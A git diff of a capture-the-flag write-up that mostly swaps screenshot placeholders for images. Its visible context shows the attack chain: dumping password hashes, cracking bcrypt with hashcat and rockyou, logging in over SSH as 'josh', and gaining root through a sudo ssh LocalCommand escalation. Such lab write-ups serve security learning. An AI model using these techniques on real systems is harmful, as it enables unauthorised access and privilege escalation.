@@ -198,7 +198,7 @@ select * from users;
 
 The `users` table contained password hashes (bcrypt-style). 
 
-📸 **Screenshot slot:** users table showing hashes
+
 ![alt text](screenshots/admin.png)
 
 ### Crack bcrypt with hashcat
@@ -212,11 +212,12 @@ The admin hash cracked to:
 ```bash
 hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt
 ```
-
-📸 **Screenshot slot:** hashcat cracked output
-![alt text](screenshots/josh.png)
+ hashcat cracked output
+![alt text](screenshots/pass.png)
 
 ### SSH as user `josh`
+![alt text](screenshots/josh.png)
+
 
 The system had a real user `josh`, and the cracked password worked for SSH login. 
 
@@ -252,10 +253,10 @@ sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127
 
 If it connects successfully, it drops into a root shell.
 
-📸 **Screenshot slot:** root shell proof (`id`)
+ root shell proof (`id`)
 ![alt text](screenshots/privesc.png)
 
-✅ **Root flag placeholder:**
+✅ **Root flag**
 `/root/root.txt` 
 ![alt text](screenshots/done.png)
 
